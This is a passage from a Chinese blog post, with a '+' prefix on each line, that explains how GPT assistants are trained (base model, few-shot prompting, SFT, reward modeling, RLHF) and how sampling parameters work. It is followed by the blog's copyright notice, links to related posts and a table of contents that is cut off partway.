+<h2 id="基座模型"><a href="#基座模型" class="headerlink" title="基座模型"></a>基座模型</h2><p>通过一个月的训练，在<strong>通用语料</strong>上构建的<strong>基座模型</strong>，能够针<strong>对任意的下游任务进行微调</strong>，预测的结果通常语句通顺、语义连贯。</p>
+<h3 id="分类任务"><a href="#分类任务" class="headerlink" title="分类任务"></a>分类任务</h3><p>针对分类任务进行<strong>微调</strong>的话，可以：</p>
+<ul>
+<li>以前的做法是收集正负样本，训练某种NLP模型。</li>
+<li>现在的做法是忽略情感分类，通过训练大型 Transformer，进行few-shot或zero-shot的文本生成，具有语义理解和泛化能力，进行高效的微调。</li>
+</ul>
+<h3 id="提示工程-文档补全（GPT-2）"><a href="#提示工程-文档补全（GPT-2）" class="headerlink" title="提示工程 + 文档补全（GPT-2）"></a>提示工程 + 文档补全（GPT-2）</h3><blockquote>
+<p>在 GPT-2 时代，人们注意到<strong>比微调更好的方法</strong>是<strong>给模型以有效的提示</strong>。 <strong>语言模型功能其实非常单一，它们只想要补全文档</strong>（预测下一个 token 的高级形式），换句话说， 如果你想让它们完成其他任务，就要通过某些方式<strong>骗一下它们</strong>，让它们以为自己在补全文档就行了。——出自[State of GPT译文][1]</p>
+</blockquote>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/gpt-2.png" alt="img"></p>
+<p>如下输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">问题：风扇有几个扇叶？</span><br><span class="line">回答：3</span><br><span class="line">问题：摩托车有几个车轮？</span><br><span class="line">回答：</span><br></pre></td></tr></table></figure>
+
+<p>可以得到模型生成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p>即使GPT-5甚至未来，提示工程都对模型输出有优化作用。这就是<font>few-shot</font>，让它以为自己在补全（模仿）一个文档，而实际上是回答了我们的问题。</p>
+<p>下图可以看到，提示工程在很多问题上非常有效，甚至不需要训练任何神经网络或微调。</p>
+<p>　<img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/gpt-2-2.png" alt="img"></p>
+<h3 id="基础模型不是助手"><a href="#基础模型不是助手" class="headerlink" title="基础模型不是助手"></a>基础模型不是助手</h3><p>基础模型在补充回答之外的效果很差，无法对话和回答问题。通过<font>监督微调（SFT）</font>能够增强模型回答问题的能力，使生成更具有针对性。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/fig-1.png" alt="img"></p>
+<h2 id="监督微调"><a href="#监督微调" class="headerlink" title="监督微调"></a>监督微调</h2><h3 id="收集高质量数据样本"><a href="#收集高质量数据样本" class="headerlink" title="收集高质量数据样本"></a>收集高质量数据样本</h3><p>通常是由<strong>人工提供</strong>数万条像格式是<strong>“提示 + 理想回答”</strong>的<font>高质量文本</font>作为训练数据。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/sft-dataset.png" alt="img"></p>
+<h3 id="SFT训练"><a href="#SFT训练" class="headerlink" title="SFT训练"></a>SFT训练</h3><p>同预训练同样的算法和训练过程，但只需要短短几天训练即可，例如：<code>vicuna-13b</code>。能够得到回答问题的模型，而不是只会补充文本的模型，这才是<font>真正的AI助手</font>。</p>
+<p>如果想要更好的效果，还需进一步改进，从人类反馈中学习(RLHF)。</p>
+<h2 id="奖励建模"><a href="#奖励建模" class="headerlink" title="奖励建模"></a>奖励建模</h2><p>RLHF 包括奖励建模和强化学习。</p>
+<p>奖励建模阶段则是建立一个评审机制，对SFT模型生成文本进行评分，负反馈，从而优化权重。</p>
+<h3 id="建立评审机制"><a href="#建立评审机制" class="headerlink" title="建立评审机制"></a>建立评审机制</h3><p>在原文中讲述的是利用SFT模型，比较优劣远远简单于文本生成，让SFT模型能够在人工评审的样本中学习，模仿评审，进行类似二元分类的操作，从而对模型生成文本进行比较。</p>
+<p>奖励建模的模型同其他几个阶段不同，该模型只对任务进行评分，不适合单独部署，其他阶段的模型都能单独部署使用。</p>
+<h3 id="奖励"><a href="#奖励" class="headerlink" title="奖励"></a>奖励</h3><p>现在来看一下如何对奖励进行建模。</p>
+<p>将三次的提示+回答按行排列，</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://arthurchiao.art/assets/img/how-to-train-a-gpt-assistant/rm-training.png" alt="img"></p>
+<ul>
+<li><strong>蓝色</strong>的是提示（prompt tokens），每行都一样；</li>
+<li><strong>黄色</strong>的是 SFT 模型基于 prompt 产生的补全（completion tokens），每次都不同；</li>
+<li><strong>绿色</strong>的是特殊的 <code>&lt;|reward|&gt;</code> token。</li>
+</ul>
+<p>这些数据一起作为新的输入，再训练一个 transforer 模型，</p>
+<ul>
+<li>输入：蓝色+黄色 tokens，即原始 prompt + SFT 模型补全</li>
+<li>输出：绿色 token，即奖励（分数）</li>
+</ul>
+<p>也就是说，这个模型用“原始问题 + SFT 模型补全结果”来预测“SFT 模型补全结果”的好坏。 换句话说，<strong>对每个 SFT 模型的补全质量进行预测</strong>。这个预测用数值表示结果的好坏， 我们将这个转化为一个<strong>损失函数</strong>，并训练我们的模型使得奖励预测与人工给出的 comparison 基准一致。</p>
+<p>这就是<strong>训练奖励模型的方法</strong>，这使我们能够对补全的结果好坏进行评分。</p>
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>跟基座模型、SFT 模型以及后面将介绍的强化学习模型相比，奖励模型的最大特点是<strong>不能独立部署</strong>， 也就是说不能单独部署这样的一个模型，然后接受用户提示（输入），给出有意义的输出（补全）。</p>
+<p>为什么呢？上一节的原理其实已经给出答案了：奖励模型要求的输入是“问题+回答”，它的功能是对其中的“回答”进行评分，判断其好坏。 因此它只是一个完整系统中的模块，而并不是一个可以直接面向用户的模型。</p>
+<h2 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h2><h3 id="RLHF训练"><a href="#RLHF训练" class="headerlink" title="RLHF训练"></a>RLHF训练</h3><p>通过奖励模型对根据提示生成的每个生成进行评分，高质量生成得到加分，反馈到模型权重中。即RLHF的训练过程。反复训练后得到一个可部署的模型，例如<strong>ChatGPT就是RLHF模型</strong>。</p>
+<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>Temperature 是 NLP 中的一个参数，用于控制生成文本的随机性和创造性。</p>
+<ul>
+<li>值越大，生成的结果越多样和不可预测；</li>
+<li><strong>值越小</strong>，生成的结果越保守和<strong>可预测</strong>。</li>
+</ul>
+<p>repetition_penalty设置为大于 1 的数值后，能够避免程序输出太多的重复内容（对重复内容进行生成惩罚）。</p>
+<p>no_repeat_ngram_size设置为某个整数时，模型在生成的时候，会杜绝连续生成相同的或者连续的 n 个重复词组。</p>
+<p>Top_k设置可能出现词的范围，即单次采用token数量，Top_p设置单次累积采用的阈值，越大越好，防止出现重复单词。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据克伯利大学给出的ELO评分，目前<strong>排名前三的都是RLHF模型</strong>，其他均是SFT模型，目前效果最好的是GPT-4模型。</p>
+<h3 id="为什么要使用-RLHF？"><a href="#为什么要使用-RLHF？" class="headerlink" title="为什么要使用 RLHF？"></a>为什么要使用 RLHF？</h3><p>简单回答是：<strong>效果好</strong>。 下图来自 InstructGPT 论文，其中 PPO 模型就是 RLHF 的。 从人类的反馈来看，质量从高到低依次为：RLHF 模型、SFT 模型、基座模型。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/why-rlhf-1.png" alt="img"></p>
+<p>那么，为什么 RLHF 效果这么好呢？<strong>社区并没有一个公认的解释</strong>， 但这里我可以提供一个可能的原因：<strong>比较（comparison）和生成（generation）在计算上的不对称性</strong>。</p>
+<p>以生成一个俳句为例。假设让一个模型写一个关于回形针的俳句，</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/why-rlhf-2.png" alt="img"></p>
+<ul>
+<li>如果你是一个承包商，为 SFT 收集数据，那你应该如何为回形针创作一个好的俳句呢？这<strong>很难</strong>；</li>
+<li>另一方面，但如果给你一些俳句的例子，让你对它们的好坏进行比较（评分），这个就<strong>简单</strong>多了；</li>
+</ul>
+<p>因此，判断比生成要容易的多。这种<strong>不对称性使得 comparison 成为一种潜在的更好方式</strong>（好落地，实操性强）， 可以利用人的判断力来创建一个更好的模型。</p>
+<h3 id="模型的熵"><a href="#模型的熵" class="headerlink" title="模型的熵"></a>模型的熵</h3><p>某些情况下，RLHF 模型并不是基础模型的简单改进。特别是，我们注意到 RLHF 模型会<strong>丢失一些熵</strong>。</p>
+<ul>
+<li>这意味着它们会给出<strong>更加确定性的结果</strong>；相比基础模型，RLHF 模型的输出变化更少；</li>
+<li>基础模型熵比较大，会给出很多不同的输出。</li>
+</ul>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/mode-collapse.png" alt="img"></p>
+<p>在以下情况下，我仍然喜欢使用基础模型：已经有 N 个东西，想生成更多类似的东西时。 例如下图，给出了 7 个 pokeman 名字，想得到更多类似的名字，</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/mode-collapse-2.png" alt="img"></p>
+<p>后面给出的这些名字看着都是虚构的（没去验证）。我认为这种任务基础模型很擅长， 因为它熵比较大，因此能给出多样的、酷炫的、与之前给出的东西相似的输出。</p>
+<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ol>
+<li><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://build.microsoft.com/en-US/sessions/db3f4859-cd30-4445-a0cd-553c3304f8e2">State of GPT</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://colab.research.google.com/drive/1SiF0KZJp75rUeetKOWqpsA8clmHP6jMg">TRANSFORMERS FROM SCRATCH</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://colab.research.google.com/drive/1SiF0KZJp75rUeetKOWqpsA8clmHP6jMg">GPT as a finite-state markov chain</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/datawhalechina/learn-nlp-with-transformers/blob/main/docs/%E7%AF%87%E7%AB%A02-Transformer%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/2.4-%E5%9B%BE%E8%A7%A3GPT.md">图解GPT</a></p>
+</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.yunjiguan.com">Daoji</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.yunjiguan.com/posts/60917.html">https://www.yunjiguan.com/posts/60917.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://www.yunjiguan.com" target="_blank">盗计のBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/blog/">blog</a></div><div class="post-share"><div class="social-share" data-image="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/High_five_u364.svg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/44550.html" title="CSS设置height 100%不生效"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/online_discussion_5wgl.svg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">CSS设置height 100%不生效</div></div><div class="info-2"><div class="info-item-1">CSS设置height: 100%不生效父元素没有固定高度的时候，子元素设置height: 100%不生效。但是可以通过flexbox布局或者grid布局来让元素自动填充剩余宽度或者高度。 html： 123&lt;div class=&quot;parent&quot;&gt;  &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;&lt;/div&gt;  css： 12345678910.parent &#123;  display: flex;  flex-direction: column; /* 确保子元素在父元素内垂直排列 */&#125;.child &#123;  flex-grow: 1; /* 让子元素填充剩余空间 */  /* 或者使用 flex: 1; 也可以实现同样的效果 */&#125;  </div></div></div></a><a class="pagination-related" href="/posts/33210.html" title="个人免签方案"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/creative_thinking_b3bc.svg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">个人免签方案</div></div><div class="info-2"><div class="info-item-1">个人免签方案方案说明介绍个人免签国内主要是解决网银的微信+支付宝支付渠道的对接，这两种方案要进行免签的话，可以通过监听通知消息回写数据库达到转账记录的目的，通过+/-0.1 金额进行多笔订单同时转账场景下确保订单一致性。比较符合的就有 V 免签、码支付、彩虹交易等。其中只有 V 免签有良好的开源生态，因此选用 V 免签进行定制化。 方案调研手机监听Android 15 Supported vmq apk PC 监听未开源 PC 端 Linux 虚拟化itchat-uos 架构设计 Api: fastapi + python3.12 SQL DB: Postgres Cache DB: Redis Cron: apscheduler Python Lint: ruff + mypy  设计问题同时多个订单生成，如何区分不同订单支付的通过订单金额不同，以 0.1 步长形成一个梯度去生成订单，同时对 key (price+商户 ID) 使用一个超时异步锁，设置默认 1 分钟超时时间，以订单生成时间字段形成一个锁，每次查询 uid 下最后一个订单，时间超过 1...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/posts/52803.html" title="Golang题库（十）"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/winter_designer_a2m7.svg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-05</div><div class="info-item-2">Golang题库（十）</div></div></div></a><a class="pagination-related no-desc" href="/posts/19522.html" title="Python使用ETCD3"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/Destination_6jtj.svg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-25</div><div class="info-item-2">Python使用ETCD3</div></div></div></a><a class="pagination-related" href="/posts/51030.html" title="Python使用gRPC协议通信"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/spreadsheets_xdjy.svg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-25</div><div class="info-item-2">Python使用gRPC协议通信</div></div><div class="info-2"><div class="info-item-1">简单介绍gRPC是谷歌开源的通信协议，支持多开发语言，可以实现跨语言调用，函数调用的形式非常直观，需要编写Protobuf 文件，生成对应开发语言的模块文件。Protobuf 数据序列化传输是二进制协议传输，相对json、xml等格式要更加轻量。是目前微服务最流行使用的协议。 gRPC官网 安装12pip install grpcio #安装grpcpip install grpcio-tools #安装grpc tools  gRPC模式gRPC提供了四种服务模式：  一元 RPC，其中客户端向服务端发送单个请求并获得 单响应返回，就像正常的函数调用一样。 1rpc SayHello(HelloRequest) returns (HelloResponse); 服务端流式 RPC，其中客户端向服务端发送请求，并获得一个流来读取一系列消息。客户端从返回的流中读取，直到没有更多消息为止。gRPC 保证在单个 RPC 调用中进行消息排序。 1rpc LotsOfReplies(HelloRequest) returns (stream HelloResponse); 客户端流式...</div></div></div></a><a class="pagination-related" href="/posts/91.html" title="Vue3优秀库"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/floating_61u6.svg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-24</div><div class="info-item-2">Vue3优秀库</div></div><div class="info-2"><div class="info-item-1"> VueUse  vs code插件 JSON2TS json生成ts代码  Css查阅资料 [Css语法查询-英文]: https://cssreference.io/    “cssreference.io”  </div></div></div></a><a class="pagination-related" href="/posts/15671.html" title="Vue3+TS+vite+pinia"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/fireworks_q5ji.svg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-20</div><div class="info-item-2">Vue3+TS+vite+pinia</div></div><div class="info-2"><div class="info-item-1">前置准备插件安装 volar TS（volar）  环境安装 node.js 16 (17之后使用openssl v3导致证书检验严格，出现报错。可以通过参数设置使用传统验证方式) nvm作为node.js环境管理  创建项目1npm init vue@latest   </div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="https://i.imgur.com/6DEulXU.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Daoji</div><div class="author-info-description">我在这里记录我的生活，记录我的学习，知识的积累使我自信和满足，感情的沉积使我成长和强大。我的博客只记录我想记录的东西。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/daojiAnime" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="tencent://message/?uin=133397418" rel="external nofollow noreferrer" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #12B7F5;"></i></a><a class="social-icon" href="/assets/img/weixin.jpg" target="_blank" title="微信"><i class="fab fa-weixin" style="color: #07C160;"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa-solid fa-rss" style="color: #FFA500;"></i></a><a class="social-icon" href="mailto:daoji.chang@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GPT%E5%AD%A6%E4%B9%A0%E5%88%86%E4%BA%AB"><span class="toc-number">1.</span> <span class="toc-text">GPT学习分享</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-number">1.1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E7%8A%B6%E6%80%81%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E9%93%BE%EF%BC%88FSMC%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">有限状态马尔可夫链（FSMC）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6GPT"><span class="toc-number">1.3.</span> <span class="toc-text">二进制GPT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#token%E5%8F%AA%E6%9C%890%E5%92%8C1"><span class="toc-number">1.3.1.</span> <span class="toc-text">token只有0和1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8A%B6%E6%80%81-%E4%B8%8A%E4%B8%8B%E6%96%87-%E5%92%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E9%95%BF%E5%BA%A6"><span class="toc-number">1.3.2.</span> <span class="toc-text">状态(上下文)和上下文长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8A%B6%E6%80%81%E7%A9%BA%E9%97%B4"><span class="toc-number">1.3.3.</span> <span class="toc-text">状态空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F%E5%AE%9E%E7%9A%84%E7%8A%B6%E6%80%81%E7%A9%BA%E9%97%B4"><span class="toc-number">1.3.4.</span> <span class="toc-text">真实的状态空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BB"><span class="toc-number">1.3.5.</span> <span class="toc-text">状态转移</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E8%AE%A8%E8%AE%BA"><span class="toc-number">1.4.</span> <span class="toc-text">问题讨论</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%8D%E5%85%B8%E5%A4%A7%E5%B0%8F%E5%92%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E9%95%BF%E5%BA%A6"><span class="toc-number">1.4.1.</span> <span class="toc-text">词典大小和上下文长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E5%A4%A7%E5%B0%8F%EF%BC%88GPT-2-3-4%EF%BC%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">模型参数大小（GPT 2&#x2F;3&#x2F;4）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AI-%E5%AE%89%E5%85%A8"><span class="toc-number">1.4.3.</span> <span class="toc-text">AI 安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%9F%E7%9D%80%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AAbabyGPT"><span class="toc-number">1.4.4.</span> <span class="toc-text">跟着代码学习构建一个babyGPT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B%E7%9A%84Transformer"><span class="toc-number">1.5.</span> <span class="toc-text">原始的Transformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Transformer%E7%9A%84%E8%BF%9B%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">Transformer的进化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#auto-encoder%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">1.6.1.</span> <span class="toc-text">auto-encoder的优缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#auto-regressive%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">1.6.2.</span> <span class="toc-text">auto-regressive的优缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E5%8C%96"><span class="toc-number">1.6.3.</span> <span class="toc-text">变化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%AD%E7%BB%83AI%E5%8A%A9%E6%89%8B%E5%BC%95%E8%A8%80"><span class="toc-number">1.7.</span> <span class="toc-text">训练AI助手引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E8%AE%AD%E7%BB%83"><span class="toc-number">1.8.</span> <span class="toc-text">预训练</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E9%9B%86"><span class="toc-number">1.8.1.</span> <span class="toc-text">数据集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E6%9C%ACtoken%E5%8C%96"><span class="toc-number">1.8.2.</span> <span class="toc-text">文本token化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%85%E5%8F%82%E6%95%B0"><span class="toc-number">1.8.3.</span> <span class="toc-text">超参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E4%BB%B6%E7%8E%AF%E5%A2%83%E5%92%8C%E6%88%90%E6%9C%AC"><span class="toc-number">1.8.4.</span> <span class="toc-text">硬件环境和成本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%AD%E7%BB%83%E8%BF%87%E7%A8%8B"><span class="toc-number">1.8.5.</span> <span class="toc-text">训练过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%B5%8B%E4%B8%8B%E4%B8%80%E4%B8%AAtoken"><span class="toc-number">1.8.6.</span> <span class="toc-text">预测下一个token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.7.</span> <span class="toc-text">损失函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E5%BA%A7%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.9.</span> <span class="toc-text">基座模型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.9.1.</span> <span class="toc-text">分类任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA%E5%B7%A5%E7%A8%8B-%E6%96%87%E6%A1%A3%E8%A1%A5%E5%85%A8%EF%BC%88GPT-2%EF%BC%89"><span class="toc-number">1.9.2.</span> <span class="toc-text">提示工程 + 文档补全（GPT-2）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A8%A1%E5%9E%8B%E4%B8%8D%E6%98%AF%E5%8A%A9%E6%89%8B"><span class="toc-number">1.9.3.</span> <span class="toc-text">基础模型不是助手</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E7%9D%A3%E5%BE%AE%E8%B0%83"><span class="toc-number">1.10.</span> <span class="toc-text">监督微调</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E9%AB%98%E8%B4%A8%E9%87%8F%E6%95%B0%E6%8D%AE%E6%A0%B7%E6%9C%AC"><span class="toc-number">1.10.1.</span> <span class="toc-text">收集高质量数据样本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SFT%E8%AE%AD%E7%BB%83"><span class="toc-number">1.10.2.</span> <span class="toc-text">SFT训练</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%96%E5%8A%B1%E5%BB%BA%E6%A8%A1"><span class="toc-number">1.11.</span> <span class="toc-text">奖励建模</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E8%AF%84%E5%AE%A1%E6%9C%BA%E5%88%B6"><span class="toc-number">1.11.1.</span> <span class="toc-text">建立评审机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%96%E5%8A%B1"><span class="toc-number">1.11.2.</span> <span class="toc-text">奖励</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E7%82%B9"><span class="toc-number">1.11.3.</span> <span class="toc-text">特点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.12.</span> <span class="toc-text">强化学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RLHF%E8%AE%AD%E7%BB%83"><span class="toc-number">1.12.1.</span> <span class="toc-text">RLHF训练</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-number">1.13.</span> <span class="toc-text">参数</span></a></li><li class="toc-item toc-level-2"><a 